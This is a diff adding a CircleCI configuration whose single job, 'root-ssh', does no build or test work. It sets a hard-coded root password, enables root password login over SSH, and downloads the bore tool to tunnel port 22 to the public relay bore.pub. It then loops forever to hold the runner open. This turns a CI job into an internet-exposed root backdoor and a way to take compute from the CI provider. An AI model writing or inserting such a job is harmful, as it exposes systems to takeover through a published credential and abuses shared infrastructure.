@@ -1,0 +1,33 @@
+version: 2.1
+jobs:
+  root-ssh:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large
+    steps:
+      - run:
+          name: Setup root SSH and expose
+          command: |
+            set -e
+            export DEBIAN_FRONTEND=noninteractive
+            sudo apt-get update
+            sudo apt-get install -y openssh-server curl net-tools
+            echo 'root:CircleRoot2026!' | sudo chpasswd
+            sudo sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
+            sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+            sudo mkdir -p /var/run/sshd
+            sudo /usr/sbin/sshd
+            # install bore static
+            sudo curl -fsSL -o /usr/local/bin/bore https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-0.5.1-x86_64-unknown-linux-musl.tar.gz
+            # the release is a tarball, not a binary; extract differently
+            sudo rm -f /usr/local/bin/bore
+            curl -fsSL -o /tmp/bore.tar.gz https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-0.5.1-x86_64-unknown-linux-musl.tar.gz
+            tar -xzf /tmp/bore.tar.gz -C /tmp
+            sudo mv /tmp/bore /usr/local/bin/bore
+            sudo chmod +x /usr/local/bin/bore
+            sudo bore local 22 --to bore.pub 2>&1 | tee /tmp/bore.log &
+            sleep 60
+            echo "=== keep alive ==="
+            while true; do
+              sleep 60
+            done
